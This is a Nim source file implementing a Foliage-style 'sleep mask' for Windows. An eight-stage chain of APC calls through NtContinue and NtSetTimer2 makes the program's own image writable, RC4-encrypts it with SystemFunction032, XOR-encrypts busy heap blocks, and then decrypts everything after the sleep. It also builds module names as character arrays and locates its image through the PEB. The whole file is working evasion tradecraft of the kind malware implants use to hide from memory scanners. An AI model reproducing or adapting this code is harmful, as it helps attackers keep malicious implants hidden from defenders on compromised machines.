# sleep.nim — Foliage-style APC sleep mask (NtSetTimer2 + APC chain)
#
# Encrypt/decrypt: SystemFunction032 RC4 via SLEEP_KEY.
# APC chain for obfuscated sleep with heap XOR encryption.

import winim
import defs

const
  CTX_RCX: uint = 0x80
  CTX_RDX: uint = 0x88
  CTX_R8:  uint = 0x90
  CTX_R9:  uint = 0x98
  CTX_RIP: uint = 0xF8
  PROCESS_HEAP_ENTRY_BUSY: uint16 = 0x0004'u16
  INFINITE_WAIT: uint32 = 0xFFFFFFFF'u32

type
  PROCESS_HEAP_ENTRY {.pure.} = object
    lpData:       pointer
    cbData:       uint32
    cbOverhead:   byte
    iRegionIndex: byte
    wFlags:       uint16
    data:         array[32, byte]

type
  NtSetTimer2Fn        = proc(h, due, period, apc: pointer): int32 {.stdcall.}
  NtCreateTimer2Fn     = proc(out, obj, attr, typ: pointer): int32 {.stdcall.}
  NtQueueApcThreadFn   = proc(thread, fn, a1, a2, a3: pointer): int32 {.stdcall.}
  NtWaitForSingleObjFn = proc(h: pointer, alt: byte, timeout: ptr int64): int32 {.stdcall.}
  NtGetCurrentThreadFn = proc(): pointer {.stdcall.}
  RtlCaptureContextFn  = proc(ctx: pointer) {.stdcall.}
  NtContinueFn         = proc(ctx: pointer, alert: byte): int32 {.stdcall.}
  SystemFunction032Fn  = proc(data, key: pointer): int32 {.stdcall.}
  CreateEventWFn       = proc(attr: pointer, manual, init: int32, name: ptr uint16): pointer {.stdcall.}
  SetEventFn           = proc(h: pointer): int32 {.stdcall.}
  WaitForSingleObjFn   = proc(h: pointer, ms: uint32): uint32 {.stdcall.}
  VirtualProtectFn     = proc(addr: pointer, size: uint, prot: uint32, old: ptr uint32): int32 {.stdcall.}
  CloseHandleFn        = proc(h: pointer): int32 {.stdcall.}
  GetProcessHeapFn     = proc(): pointer {.stdcall.}
  HeapWalkFn           = proc(heap: pointer, entry: ptr PROCESS_HEAP_ENTRY): int32 {.stdcall.}
  GetCurrentProcessFn  = proc(): pointer {.stdcall.}

proc ctxWrite(ctx: pointer, offset: uint, val: uint64) {.inline.} =
  # unsafe
  cast[ptr uint64](cast[uint](ctx) + offset)[] = val

proc heapWalkXor*(
  key:       ptr array[16, byte],
  fnGetHeap: GetProcessHeapFn,
  fnWalk:    HeapWalkFn,
) =
  # unsafe
  let heap = fnGetHeap()
  if heap == nil: return

  var entry: PROCESS_HEAP_ENTRY
  zeroMem(addr entry, sizeof(entry))

  while true:
    let r = fnWalk(heap, addr entry)
    if r == 0: break
    if (entry.wFlags and PROCESS_HEAP_ENTRY_BUSY) == 0: continue
    if entry.cbData < 8: continue
    let p    = cast[ptr byte](entry.lpData)
    let size = int(entry.cbData)
    for i in 0 ..< size:
      cast[ptr byte](cast[uint](p) + uint(i))[] =
        cast[ptr byte](cast[uint](p) + uint(i))[] xor key[][i mod 16]

proc heapXorTrampoline*(
  keyPtr:    ptr array[16, byte],
  fnGetHeap: GetProcessHeapFn,
  fnWalk:    HeapWalkFn,
) {.stdcall.} =
  if keyPtr == nil: return
  heapWalkXor(keyPtr, fnGetHeap, fnWalk)

proc executeSleepMask*(
  imageBase:       ptr byte,
  imageSize:       uint,
  sleepTime:       uint32,
  key:             ptr array[16, byte],
  fnCapture:       RtlCaptureContextFn,
  fnContinue:      NtContinueFn,
  fnSys032:        SystemFunction032Fn,
  fnVp:            VirtualProtectFn,
  fnEvent:         CreateEventWFn,
  fnSetEvent:      SetEventFn,
  fnWait:          WaitForSingleObjFn,
  fnClose:         CloseHandleFn,
  fnNtCreateTimer: NtCreateTimer2Fn,
  fnNtSetTimer:    NtSetTimer2Fn,
  fnNtQueueApc:    NtQueueApcThreadFn,
  fnNtWaitAlert:   NtWaitForSingleObjFn,
  fnGetThread:     NtGetCurrentThreadFn,
  fnGetHeap:       GetProcessHeapFn,
  fnHeapWalk:      HeapWalkFn,
) =
  # unsafe
  var keyBuf = key[]
  var keyStr = USTRING(Length: 16, MaximumLength: 16, Buffer: addr keyBuf[0])
  var datStr = USTRING(Length: uint32(imageSize), MaximumLength: uint32(imageSize),
                       Buffer: imageBase)

  var oldProtect: array[2, uint32]
  let hSleep = fnEvent(nil, 0, 0, nil)
  let hWake  = fnEvent(nil, 0, 0, nil)

  # CONTEXT slots: thread + 8 APC stages
  var ctxThread = CONTEXT_BUF()
  var ctxVp1    = CONTEXT_BUF()
  var ctxEnc    = CONTEXT_BUF()
  var ctxHenc   = CONTEXT_BUF()
  var ctxEvt    = CONTEXT_BUF()
  var ctxHdec   = CONTEXT_BUF()
  var ctxDec    = CONTEXT_BUF()
  var ctxVp2    = CONTEXT_BUF()
  var ctxRes    = CONTEXT_BUF()

  fnCapture(addr ctxThread)

  # Clone base context into every APC slot
  for ctxPtr in [addr ctxVp1, addr ctxEnc, addr ctxHenc, addr ctxEvt,
                  addr ctxHdec, addr ctxDec, addr ctxVp2, addr ctxRes]:
    copyMem(ctxPtr, addr ctxThread, sizeof(CONTEXT_BUF))

  # APC-1: VirtualProtect RX→RW
  ctxWrite(addr ctxVp1, CTX_RIP, cast[uint64](fnVp))
  ctxWrite(addr ctxVp1, CTX_RCX, cast[uint64](imageBase))
  ctxWrite(addr ctxVp1, CTX_RDX, uint64(imageSize))
  ctxWrite(addr ctxVp1, CTX_R8,  uint64(PAGE_READWRITE))
  ctxWrite(addr ctxVp1, CTX_R9,  cast[uint64](addr oldProtect[0]))

  # APC-2: SystemFunction032 encrypt PE
  ctxWrite(addr ctxEnc, CTX_RIP, cast[uint64](fnSys032))
  ctxWrite(addr ctxEnc, CTX_RCX, cast[uint64](addr datStr))
  ctxWrite(addr ctxEnc, CTX_RDX, cast[uint64](addr keyStr))

  # APC-3: heap XOR encrypt
  ctxWrite(addr ctxHenc, CTX_RIP, cast[uint64](heapXorTrampoline))
  ctxWrite(addr ctxHenc, CTX_RCX, cast[uint64](key))
  ctxWrite(addr ctxHenc, CTX_RDX, cast[uint64](fnGetHeap))
  ctxWrite(addr ctxHenc, CTX_R8,  cast[uint64](fnHeapWalk))

  # APC-4: SetEvent(hSleep)
  ctxWrite(addr ctxEvt, CTX_RIP, cast[uint64](fnSetEvent))
  ctxWrite(addr ctxEvt, CTX_RCX, cast[uint64](hSleep))

  # APC-5: heap XOR decrypt
  ctxWrite(addr ctxHdec, CTX_RIP, cast[uint64](heapXorTrampoline))
  ctxWrite(addr ctxHdec, CTX_RCX, cast[uint64](key))
  ctxWrite(addr ctxHdec, CTX_RDX, cast[uint64](fnGetHeap))
  ctxWrite(addr ctxHdec, CTX_R8,  cast[uint64](fnHeapWalk))

  # APC-6: SystemFunction032 decrypt PE
  ctxWrite(addr ctxDec, CTX_RIP, cast[uint64](fnSys032))
  ctxWrite(addr ctxDec, CTX_RCX, cast[uint64](addr datStr))
  ctxWrite(addr ctxDec, CTX_RDX, cast[uint64](addr keyStr))

  # APC-7: VirtualProtect RW→RX
  ctxWrite(addr ctxVp2, CTX_RIP, cast[uint64](fnVp))
  ctxWrite(addr ctxVp2, CTX_RCX, cast[uint64](imageBase))
  ctxWrite(addr ctxVp2, CTX_RDX, uint64(imageSize))
  ctxWrite(addr ctxVp2, CTX_R8,  uint64(PAGE_EXECUTE_READ))
  ctxWrite(addr ctxVp2, CTX_R9,  cast[uint64](addr oldProtect[1]))

  # APC-8: SetEvent(hWake)
  ctxWrite(addr ctxRes, CTX_RIP, cast[uint64](fnSetEvent))
  ctxWrite(addr ctxRes, CTX_RCX, cast[uint64](hWake))

  let apcFn   = cast[pointer](fnContinue)
  let hThread = fnGetThread()

  template msTo100ns(ms: uint32): int64 = -(int64(ms) * 10_000'i64)

  var hTimers: array[8, pointer]
  let access = cast[pointer](0x1F0003'u)
  let ty     = cast[pointer](0x2'u)
  for i in 0 ..< 8:
    discard fnNtCreateTimer(addr hTimers[i], nil, access, ty)

  let delays: array[8, uint32] = [
    100'u32, 200'u32, 250'u32, 300'u32,
    sleepTime + 100, sleepTime + 200, sleepTime + 300, sleepTime + 400]

  let ctxPtrs: array[8, pointer] = [
    addr ctxVp1, addr ctxEnc, addr ctxHenc, addr ctxEvt,
    addr ctxHdec, addr ctxDec, addr ctxVp2, addr ctxRes]

  for i in 0 ..< 8:
    var due = msTo100ns(delays[i])
    discard fnNtSetTimer(hTimers[i], addr due, nil, nil)
    discard fnNtQueueApc(hThread, apcFn, ctxPtrs[i], nil, nil)

  discard fnWait(hSleep, INFINITE_WAIT)
  discard fnWait(hWake,  INFINITE_WAIT)
  discard fnContinue(addr ctxThread, 0)

  discard fnClose(hSleep)
  discard fnClose(hWake)
  for i in 0 ..< 8: discard fnClose(hTimers[i])

proc obfuscatedSleep*(ms: uint32, key: ptr array[16, byte]) =
  # unsafe — resolves fn ptrs and delegates to executeSleepMask
  var ntdllName = [uint16('n'),uint16('t'),uint16('d'),uint16('l'),uint16('l'),
                   uint16('.'),uint16('d'),uint16('l'),uint16('l'),0'u16]
  var k32Name   = [uint16('k'),uint16('e'),uint16('r'),uint16('n'),uint16('e'),
                   uint16('l'),uint16('3'),uint16('2'),uint16('.'),uint16('d'),
                   uint16('l'),uint16('l'),0'u16]
  let ntdll = GetModuleHandleW(cast[LPCWSTR](addr ntdllName[0]))
  let k32  = GetModuleHandleW(cast[LPCWSTR](addr k32Name[0]))
  if ntdll == nil or k32 == nil: return

  template gpa(h: HMODULE, name: cstring): pointer =
    cast[pointer](GetProcAddress(h, name))

  let fnCapture  = cast[RtlCaptureContextFn](gpa(ntdll, "RtlCaptureContext"))
  let fnContinue = cast[NtContinueFn](gpa(ntdll, "NtContinue"))
  let fnSys032   = cast[SystemFunction032Fn](gpa(ntdll, "SystemFunction032"))
  let fnVp       = cast[VirtualProtectFn](gpa(k32,   "VirtualProtect"))
  let fnEvent    = cast[CreateEventWFn](gpa(k32,   "CreateEventW"))
  let fnSetEvt   = cast[SetEventFn](gpa(k32,   "SetEvent"))
  let fnWait     = cast[WaitForSingleObjFn](gpa(k32,   "WaitForSingleObject"))
  let fnClose    = cast[CloseHandleFn](gpa(k32,   "CloseHandle"))
  let fnNct2     = cast[NtCreateTimer2Fn](gpa(ntdll, "NtCreateTimer2"))
  let fnNst2     = cast[NtSetTimer2Fn](gpa(ntdll, "NtSetTimer2"))
  let fnNapc     = cast[NtQueueApcThreadFn](gpa(ntdll, "NtQueueApcThread"))
  let fnNwait    = cast[NtWaitForSingleObjFn](gpa(ntdll, "NtWaitForSingleObject"))
  let fnGthr     = cast[NtGetCurrentThreadFn](gpa(ntdll, "NtGetCurrentThread"))
  let fnGetHeap  = cast[GetProcessHeapFn](gpa(k32,   "GetProcessHeap"))
  let fnHeapWalk = cast[HeapWalkFn](gpa(k32,   "HeapWalk"))

  # Find own image base + size via PEB
  var peb: uint
  {.emit: """__asm__ volatile ("movq %%gs:0x60, %0" : "=r"(`peb`));""".}
  let imgBase = cast[ptr byte](cast[ptr uint](peb + 0x10)[])
  let dosHdr  = cast[ptr IMAGE_DOS_HEADER](imgBase)
  let ntHdr   = cast[ptr IMAGE_NT_HEADERS64](cast[uint](imgBase) + uint(dosHdr[].e_lfanew))
  let imgSize = uint(ntHdr[].OptionalHeader.SizeOfImage)

  executeSleepMask(
    imgBase, imgSize, ms, key,
    fnCapture, fnContinue, fnSys032, fnVp,
    fnEvent, fnSetEvt, fnWait, fnClose,
    fnNct2, fnNst2, fnNapc, fnNwait, fnGthr,
    fnGetHeap, fnHeapWalk)
